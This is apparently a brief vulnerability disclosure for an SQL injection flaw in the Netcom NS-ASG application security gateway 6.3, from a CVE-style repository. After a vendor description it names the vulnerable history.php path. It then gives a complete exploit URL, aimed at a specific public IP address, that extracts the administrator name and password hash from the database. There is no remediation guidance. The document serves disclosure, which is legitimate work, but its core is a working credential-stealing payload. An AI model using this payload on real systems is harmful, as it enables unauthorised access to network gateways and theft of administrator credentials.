Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /WebPages/history.php


https://1.85.53.53/WebPages/history.php?uid=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20passwd)%20from%20Admin%20limit%201)))


<img width="718" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/fb09a12c-0909-4589-9beb-f3b0764726b8">
